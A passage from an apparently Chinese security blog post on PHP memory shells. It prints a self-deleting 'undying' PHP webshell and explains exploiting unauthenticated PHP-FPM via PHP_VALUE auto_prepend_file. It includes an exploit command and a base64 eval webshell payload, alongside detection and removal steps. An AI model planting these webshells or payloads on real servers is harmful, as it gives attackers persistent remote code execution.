class="hljs-keyword">if</span>(filterName.startsWith(<span class="hljs-string">&quot;memshell&quot;</span>))&#123;<br>        SecurityUtil.remove(filterObject);<br>        filterConfigMap.remove(filterName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p><a target="_blank" rel="noopener" href="https://xu-an.gitbook.io/sec/lan/java/shell/chasha">查杀Java web filter型内存马</a></p>
<h2 id="PHP内存马"><a href="#PHP内存马" class="headerlink" title="PHP内存马"></a>PHP内存马</h2><h3 id="PHP不死马"><a href="#PHP不死马" class="headerlink" title="PHP不死马"></a>PHP不死马</h3><h5 id="PHP不死马原理"><a href="#PHP不死马原理" class="headerlink" title="PHP不死马原理"></a>PHP不死马原理</h5><p>php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。本次演示是将php不死马放到web目录下访问后及执行会在本地循环生成php一句话木马。<strong>实际上</strong>，PHP不死马并未实现无文件攻击或者内存webshell等，理论上并不属于内存马的范畴，但是关于PHP内存马的实现，确实仅有这几种方法，所以在此处简单介绍一下。</p>
<h5 id="PHP不死马代码"><a href="#PHP不死马代码" class="headerlink" title="PHP不死马代码"></a>PHP不死马代码</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>函数说明</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ignore<span class="hljs-emphasis">_user_</span>abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为true，则忽略与用户的断开。<br><span class="hljs-bullet">2.</span> set<span class="hljs-emphasis">_time_</span>limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。<br><span class="hljs-bullet">3.</span> unlink(<span class="hljs-strong">__FILE__</span>)函数：删除文件。<br><span class="hljs-bullet">4.</span> file<span class="hljs-emphasis">_put_</span>contents函数：将一个字符串写入文件。<br><span class="hljs-bullet">5.</span> usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。<br></code></pre></td></tr></table></figure>

<p>访问成功，并且无法删除。</p>
<p><img src="https://img-blog.csdnimg.cn/f48ed242292b4081bb09e54ea03f1878.png" srcset="/img/loading.gif" lazyload alt="image-20220608210706421"></p>
<p>值得注意的是php一般都有设置php超时事件，所以php后台运行一定时间后可能会自动终止。<img src="https://img-blog.csdnimg.cn/10f20ee4ee654bcf9d85ba3cd046eccf.png" srcset="/img/loading.gif" lazyload alt="image-20220608221221995"></p>
<h5 id="检测思路"><a href="#检测思路" class="headerlink" title="检测思路"></a>检测思路</h5><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-number">1.</span> 检查所有php进程处理请求的持续时间(<span class="hljs-built_in">top</span>|<span class="hljs-type">grep</span> http)<br><span class="hljs-number">2.</span> 检测执行文件是否在文件系统真实存在<br></code></pre></td></tr></table></figure>

<h5 id="查杀PHP不死马"><a href="#查杀PHP不死马" class="headerlink" title="查杀PHP不死马"></a>查杀PHP不死马</h5><ul>
<li>重启php服务器</li>
<li>强行kill后台进程 <code>ps aux|grep www-data|awk &#39;&#123;print 2&#125;&#39;| xargs kill -9</code></li>
<li>竞争删除</li>
</ul>
<p>对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode 运行了。使用条件竞争写入同名文件进行克制不死马。</p>
<p><img src="https://img-blog.csdnimg.cn/504f72b4cd7c44d983dcf88da8bef40c.png" srcset="/img/loading.gif" lazyload alt="image-20220608211639286"></p>
<p><img src="https://img-blog.csdnimg.cn/7102dd16e6db4414a06c5f782dd03abd.png" srcset="/img/loading.gif" lazyload alt="image-20220608211558944"></p>
<h3 id="FastCGI马"><a href="#FastCGI马" class="headerlink" title="FastCGI马"></a>FastCGI马</h3><p>​		在了解FastCGI马之前，我们先来简要介绍一下<code>FastCGI</code>是个什么东东。</p>
<h4 id="CGI与FastCGI"><a href="#CGI与FastCGI" class="headerlink" title="CGI与FastCGI"></a>CGI与FastCGI</h4><p>​		首先，我们来了解一下什么是<code>CGI</code>：以web服务器为例，我们知道apache可以用于搭建web服务器，但是apache只能够解析静态网页，也就是<code>html</code>类型网页；当然，我们可以安装php组件，通过apache配置文件使其能够解析php。这其中就用到了<code>CGI</code>，<strong>CGI是指Web Server 与 Web Application 之间数据交换的一种通信协议</strong>，当apache需要解析php时，他会通过配置文件获取到解析php服务的应用端口，并将需要解析的文件数据通过<code>CGI</code>协议交给PHP解析器。也就是说apache和php之间并不是一个整体（这是我以前误解的地方），而是apache通过<code>CGI</code>协议内部访问php解析器来实现php解析的。而<code>FastCGI</code>是<code>CGI</code>的升级版本，比 <code>CGI </code>在效率上做了一些优化。<strong>两者的区别是：</strong><code>CGI</code>每次解析是都会重新启动一个解析器进程，重新读取配置文件，重新载入扩展，解析完成后退出；而<code>FastCGI</code>是一种常驻型的<code>CGI</code>，只在进程启动时读取一次配置文件，请求解析完成后也不会退出，这样大大提高了性能。</p>
<p>​		类比于HTTP协议，<code>FastCGI</code>协议是服务器中间件与某个语言后端进行数据交换中所使用的协议。<code>FastCGI</code>每次交换的消息称为<code>record</code>，这与HTTP协议请求数据包类似，<code>record</code>也有自己的<code>header</code>和<code>body</code>。<code>record</code>的头固定8个字节，<code>body</code>是由头中的<code>contentLength</code>指定，其结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-comment">/* Header */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> version; <span class="hljs-comment">// 版本</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> type; <span class="hljs-comment">// 本次record的类型</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> requestIdB1; <span class="hljs-comment">// 本次record对应的请求id</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> requestIdB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> contentLengthB1; <span class="hljs-comment">// body体的大小</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> contentLengthB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> paddingLength; <span class="hljs-comment">// 额外块大小</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> reserved; <br><br>  <span class="hljs-comment">/* Body */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> contentData[contentLength];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> paddingData[paddingLength];<br>&#125; FCGI_Record;<br></code></pre></td></tr></table></figure>

<p>语言端解析<code>FastCGI</code>头之后，会根据<code>contentLength</code>获取的<code>Body</code>的数据，<code>Body</code>后面还有一段额外的数据（Padding），其长度由头中的<code>paddingLength</code>指定，起保留作用。不需要该<code>Padding</code>的时候，将其长度设置为0即可。</p>
<p>​		在<code>FastCGI</code>请求头中有一个<code>type</code>变量，<code>type</code>用于指定该<code>record</code>的作用，不同的<code>record</code>对应的<code>bode</code>结构不同，具体含义如下：</p>
<table>
<thead>
<tr>
<th>type值</th>
<th>具体含义</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>在与php-fpm建立连接之后发送的第一个消息中的type值就得为1，用来表明此消息为请求开始的第一个消息</td>
</tr>
<tr>
<td>2</td>
<td>异常断开与php-fpm的交互</td>
</tr>
<tr>
<td>3</td>
<td>在与php-fpm交互中所发的最后一个消息中type值为此，以表明交互的正常结束</td>
</tr>
<tr>
<td>4</td>
<td>在交互过程中给php-fpm传递环境参数时，将type设为此，以表明消息中包含的数据为某个name-value对</td>
</tr>
<tr>
<td>5</td>
<td>web服务器将从浏览器接收到的POST请求数据(表单提交等)以消息的形式发给php-fpm,这种消息的type就得设为5</td>
</tr>
<tr>
<td>6</td>
<td>php-fpm给web服务器回的正常响应消息的type就设为6</td>
</tr>
<tr>
<td>7</td>
<td>php-fpm给web服务器回的错误响应设为7</td>
</tr>
</tbody></table>
<p>这里我们主要介绍<code>type</code>为4的<code>record</code>，因为<code>FastCGI</code>木马使用到了该类型的<code>record</code>，其他类型详见看<a target="_blank" rel="noopener" href="https://blog.csdn.net/shreck66/article/details/50355729">这篇文章</a>。</p>
<p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB0;  <span class="hljs-comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB0; <span class="hljs-comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameData[nameLength];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueData[valueLength];<br>&#125; FCGI_NameValuePair11;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB0;  <span class="hljs-comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB3; <span class="hljs-comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB1;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameData[nameLength];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueData[valueLength<br>          ((B3 &amp; <span class="hljs-number">0x7f</span>) &lt;&lt; <span class="hljs-number">24</span>) + (B2 &lt;&lt; <span class="hljs-number">16</span>) + (B1 &lt;&lt; <span class="hljs-number">8</span>) + B0];<br>&#125; FCGI_NameValuePair14;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB3;  <span class="hljs-comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB1;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB0; <span class="hljs-comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameData[nameLength<br>          ((B3 &amp; <span class="hljs-number">0x7f</span>) &lt;&lt; <span class="hljs-number">24</span>) + (B2 &lt;&lt; <span class="hljs-number">16</span>) + (B1 &lt;&lt; <span class="hljs-number">8</span>) + B0];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueData[valueLength];<br>&#125; FCGI_NameValuePair41;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB3;  <span class="hljs-comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB1;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameLengthB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB3; <span class="hljs-comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB1;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueLengthB0;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> nameData[nameLength<br>          ((B3 &amp; <span class="hljs-number">0x7f</span>) &lt;&lt; <span class="hljs-number">24</span>) + (B2 &lt;&lt; <span class="hljs-number">16</span>) + (B1 &lt;&lt; <span class="hljs-number">8</span>) + B0];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> valueData[valueLength<br>          ((B3 &amp; <span class="hljs-number">0x7f</span>) &lt;&lt; <span class="hljs-number">24</span>) + (B2 &lt;&lt; <span class="hljs-number">16</span>) + (B1 &lt;&lt; <span class="hljs-number">8</span>) + B0];<br>&#125; FCGI_NameValuePair44;<br></code></pre></td></tr></table></figure>

<p>这其实是4个结构，至于用哪个结构，有如下规则：</p>
<ul>
<li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li>
<li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li>
<li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li>
<li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li>
</ul>
<p>​		关于web中间件与php之间的通信，我们举个例子来进行说明。用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>    &#x27;GATEWAY_INTERFACE&#x27;<span class="hljs-punctuation">:</span> &#x27;FastCGI/1.0&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_METHOD&#x27;<span class="hljs-punctuation">:</span> &#x27;GET&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_FILENAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_NAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;QUERY_STRING&#x27;<span class="hljs-punctuation">:</span> &#x27;?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_URI&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;DOCUMENT_ROOT&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_SOFTWARE&#x27;<span class="hljs-punctuation">:</span> &#x27;php/fcgiclient&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1234</span>5&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;80&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_NAME&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost&quot;</span><span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PROTOCOL&#x27;<span class="hljs-punctuation">:</span> &#x27;HTTP/1.1&#x27;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​		Nginx将以上数据通过<code>FastCGI</code>协议格式发送给<code>PHP-FPM</code>，PHP-FPM拿到<code>FastCGI</code>的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。</p>
<h4 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h4><p>​		首先要说的是：<code>FastCGI</code>是一种协议规范，<code>php-fpm</code>最终会解析这个协议。我们知道无论是<code>CGI</code>还是<code>FastCGI</code>最终都会启动php解析器程序（<code>php-cgi</code>），但是该程序只能解析请求并不能进程管理，而<code>php-fpm</code>就是<code>php-cgi</code>的进程管理程序，它克服了<code>php-cgi</code>变更<code>php.ini</code>配置后，需重启<code>php-cgi</code>才能让新的<code>php-ini</code>生效，无法平滑重启；直接杀死<code>php-cgi</code>进程，<code>php</code>就不能运行了等问题。具体的相关信息可以看<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/110540192">这篇文章</a></p>
<h4 id="FastCGI未授权访问"><a href="#FastCGI未授权访问" class="headerlink" title="FastCGI未授权访问"></a>FastCGI未授权访问</h4><p><strong>那么，如果我们能够控制<code>FastCGI</code>的通信协议，是否可以执行任意代码呢？</strong></p>
<p>理论上当然是不可以的，但是在PHP的配置中有两个特殊的配置项可以帮我们实现这一点：<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p>
<ul>
<li><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；</li>
<li><code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</li>
</ul>
<p>如果我们设置<code>auto_prepend_file</code>为<code>php://input</code>（只要Content-Type不为<code>multipart/form-data</code>， <code>php://input</code>会填入post数据，详见<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php#wrappers.php.input">官方文档</a>），那么就等于在执行任何<code>php</code>文件前都要包含一遍<code>POST</code>的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。当然，还需要开启远程文件包含选项<code>allow_url_include</code>。</p>
<p><strong>那么，我们如何设置<code>auto-prepend_file</code>的呢?</strong></p>
<p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
<p>所以，我们最后传入如下环境变量：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>    &#x27;GATEWAY_INTERFACE&#x27;<span class="hljs-punctuation">:</span> &#x27;FastCGI/1.0&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_METHOD&#x27;<span class="hljs-punctuation">:</span> &#x27;GET&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_FILENAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_NAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;QUERY_STRING&#x27;<span class="hljs-punctuation">:</span> &#x27;?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_URI&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;DOCUMENT_ROOT&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_SOFTWARE&#x27;<span class="hljs-punctuation">:</span> &#x27;php/fcgiclient&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1234</span>5&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;80&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_NAME&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost&quot;</span><span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PROTOCOL&#x27;<span class="hljs-punctuation">:</span> &#x27;HTTP/1.1&#x27;<br>    &#x27;PHP_VALUE&#x27;<span class="hljs-punctuation">:</span> &#x27;auto_prepend_file = php://input&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;PHP_ADMIN_VALUE&#x27;<span class="hljs-punctuation">:</span> &#x27;allow_url_include = On&#x27;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>漏洞复现</strong></p>
<p>复现环境可以使用vulhub的CVE-2019-11043复现环境。</p>
<p>Exp见p神的代码 <a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75%E3%80%82">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75。</a></p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python php_fpm.py 127.0.0.1 /usr/local/lib/php/PEAR.php -c &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `id`;<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/8e38a1bd0e71442e8fae9d6b325629a1.png" srcset="/img/loading.gif" lazyload alt="image-20230227212846684"></p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgi协议分析与实例</a></p>
<h3 id="利用PHP-FPM做内存马"><a href="#利用PHP-FPM做内存马" class="headerlink" title="利用PHP-FPM做内存马"></a>利用PHP-FPM做内存马</h3><p>上个章节介绍了接近内存马的PHP不死马以及利用<code>FastCGI</code>制作的木马，但是这两种木马都不符合内存马的基本特性—-<strong>PHP 代码无法长久驻留内存执行</strong>，接下来我们对<code>FastCGI</code>马进行下相应的改进使其称为真正意义上的内存马。</p>
<p>​		在<code>FastCGI</code>马中，我们使用<code>PHP_VALUE</code>设置<code>auto_prepend_file = php://input</code>从而使得http请求传入的数据得到执行，那么有没有方法使得后门代码在内存中驻留呢？*<em>我们只需要将<code>php://input</code>协议换为<code>data</code>就可以了</em>（base64的内容为<code>&lt;?php @eval($_REQUEST[test]); ?&gt;</code>）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;auto_prepend_file = php://input&#x27;</span>,<br> <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;auto_prepend_file =\&#x27;</span>data:;<span class="hljs-built_in">base64</span>,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=\&#x27;<span class="hljs-string">&#x27;,</span><br></code></pre></td></tr></table></figure>

<p><strong>Payload</strong>用P神的代码修改一下即可。</p>
<p>P神的脚本：<a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<p>源码备份：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 